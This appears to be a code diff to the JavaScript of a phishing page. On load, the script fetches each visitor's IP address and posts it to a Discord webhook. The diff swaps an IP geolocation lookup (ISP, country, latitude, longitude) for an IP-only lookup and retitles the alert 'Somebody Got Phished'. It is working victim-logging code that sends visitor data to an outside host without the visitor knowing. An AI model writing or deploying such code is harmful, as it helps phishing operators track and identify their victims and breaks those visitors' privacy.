@@ -24,8 +24,8 @@ function sendErrorToDiscord(errorMessage) {
     .catch(err => console.error("Failed to send error to Discord: ", err));
 }
 
-// Fetch IP and location information
-fetch("https://ip-api.com/json/")
+// Fetch IP address using ipify
+fetch("https://api64.ipify.org?format=json")
   .then(response => {
     if (!response.ok) {
       throw new Error(`API responded with status ${response.status}`);
@@ -33,21 +33,15 @@ fetch("https://ip-api.com/json/")
     return response.json();
   })
   .then(data => {
-    const { query: ip, isp, country, lat, lon } = data;
+    const { ip } = data; // Extract only the IP address
 
     // Prepare Discord embed
     const embed = {
       embeds: [
         {
-          title: "Website Visitor Info",
+          title: "Somebody Got Phished",
           color: 3447003, // Blue color
-          fields: [
-            { name: "IP Address", value: ip, inline: true },
-            { name: "ISP", value: isp, inline: true },
-            { name: "Country", value: country, inline: true },
-            { name: "Latitude", value: lat.toString(), inline: true },
-            { name: "Longitude", value: lon.toString(), inline: true }
-          ],
+          fields: [{ name: "IP Address", value: ip, inline: true }],
           timestamp: new Date()
         }
       ]
@@ -59,13 +53,13 @@ fetch("https://ip-api.com/json/")
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(embed)
     })
-      .then(() => console.log("Visitor data sent to Discord"))
+      .then(() => console.log("Visitor IP sent to Discord"))
       .catch(err => {
         console.error("Error sending to Discord: ", err);
-        sendErrorToDiscord(`Failed to send visitor data to Discord: ${err.message}`);
+        sendErrorToDiscord(`Failed to send visitor IP to Discord: ${err.message}`);
       });
   })
   .catch(err => {
     console.error("Error fetching IP data: ", err);
-    sendErrorToDiscord(`Failed to fetch IP data: ${err.message}`);
+    sendErrorToDiscord(`Failed to fetch IP address: ${err.message}`);
   });
